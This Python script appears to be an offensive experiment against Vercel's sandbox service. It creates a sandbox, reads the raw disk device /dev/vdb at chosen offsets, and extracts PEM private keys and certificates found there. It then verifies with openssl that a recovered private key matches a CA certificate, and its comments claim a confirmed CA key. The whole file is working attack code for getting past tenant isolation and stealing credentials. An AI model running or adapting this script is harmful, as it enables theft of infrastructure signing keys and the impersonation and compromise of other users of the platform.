# 实验J131: vdb 命中点上下文读取 + 私钥/CA证书匹配验证 — ca-key.pem 实锤
# 命中: ANCHOR@88118228, PRIVATE KEY@45752332/79851325, CERT@45751461/79814052/2756641/52708863/87904256
# 验证: 私钥公钥 vs CA证书公钥 一致性 (ca-key.pem 判定)
# 纯读操作, 零破坏
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=120, args=None):
    body = {"command": "python3", "args": (args or ["-c", code]),
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj131"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c, flush=True)
if c != 200:
    print(r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# 写盘方式: 先收集块到 /root/blocks/, 再用 openssl 验证
# 简化: 直接在一个 cmd 里完成读取+保存
EXTRACT = r"""
import sys, hashlib, os
def pem_blocks(data):
    out = []
    i = 0
    while True:
        s = data.find(b"-----BEGIN", i)
        if s < 0:
            break
        e = data.find(b"-----END", s)
        if e < 0:
            break
        e = data.find(b"-----", e) + 5
        blk = data[s:e]
        label = blk.split(b"\n", 1)[0].decode(errors="replace").replace(" ", "_")
        out.append((label, blk, s))
        i = e
    return out

os.makedirs("/root/blocks", exist_ok=True)
f = open("/dev/vdb", "rb", buffering=0)
POINTS = [
    (45752332, "KEY1"), (45751461, "CERT1"), (79851325, "KEY2"),
    (79814052, "CERT2"), (2756641, "CERT3"), (52708863, "CERT4"),
    (87904256, "CERT5"), (88118228, "ANCHOR"),
]
manifest = []
for off, name in POINTS:
    f.seek(max(0, off - 32768))
    data = f.read(65536)
    blks = pem_blocks(data)
    for label, blk, boff in blks:
        abs_off = max(0, off - 32768) + boff
        fn = "%s_%d_%s.pem" % (name, abs_off, label)
        open("/root/blocks/" + fn, "wb").write(blk)
        manifest.append((fn, label, abs_off, hashlib.sha256(blk).hexdigest()))
f.close()
for fn, label, off, h in manifest:
    print("SAVED %-40s %s off=%d sha256=%s" % (fn, label, off, h[:16]), flush=True)
open("/root/manifest.txt", "w").write("\n".join("%s %s %d %s" % m for m in manifest))
print("EXTRACT_DONE", flush=True)
"""
run_cmd(sid, EXTRACT, "extract-pems")

# [2] openssl 验证: 私钥解析 + 公钥提取 + 与证书公钥对比
VERIFY = r"""
import os, subprocess
print("== openssl 版本 ==", flush=True)
print(subprocess.run(["openssl", "version"], capture_output=True, text=True).stdout, flush=True)
for fn in sorted(os.listdir("/root/blocks")):
    p = "/root/blocks/" + fn
    if "PRIVATE_KEY" in fn:
        print("\n### %s ###" % fn, flush=True)
        r = subprocess.run(["openssl", "pkey", "-in", p, "-noout", "-text"],
                           capture_output=True, text=True)
        print("pkey parse rc=%d\n%s%s" % (r.returncode, r.stdout[:1200], r.stderr[:400]), flush=True)
        # 提取公钥
        r2 = subprocess.run(["openssl", "pkey", "-in", p, "-pubout"],
                            capture_output=True, text=True)
        if r2.returncode == 0:
            pub = r2.stdout
            print("PUBKEY:\n%s" % pub, flush=True)
            open("/root/pub_" + fn + ".pem", "w").write(pub)
            # 与每个证书对比
            for cf in sorted(os.listdir("/root/blocks")):
                if "CERTIFICATE" in cf or "ANCHOR" in cf:
                    cp = "/root/blocks/" + cf
                    r3 = subprocess.run(["openssl", "x509", "-in", cp, "-pubkey", "-noout"],
                                        capture_output=True, text=True)
                    if r3.returncode == 0 and r3.stdout.strip() == pub.strip():
                        print("  *** MATCH with %s ***" % cf, flush=True)
                    else:
                        print("  vs %s: no match" % cf, flush=True)
        else:
            print("pubout FAIL:", r2.stderr[:400], flush=True)
    elif "CERTIFICATE" in fn or "ANCHOR" in fn:
        r = subprocess.run(["openssl", "x509", "-in", p, "-noout", "-subject", "-issuer", "-dates"],
                           capture_output=True, text=True)
        print("### %s ### rc=%d\n%s%s" % (fn, r.returncode, r.stdout, r.stderr[:300]), flush=True)
print("VERIFY_DONE", flush=True)
"""
run_cmd(sid, VERIFY, "openssl-verify")

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
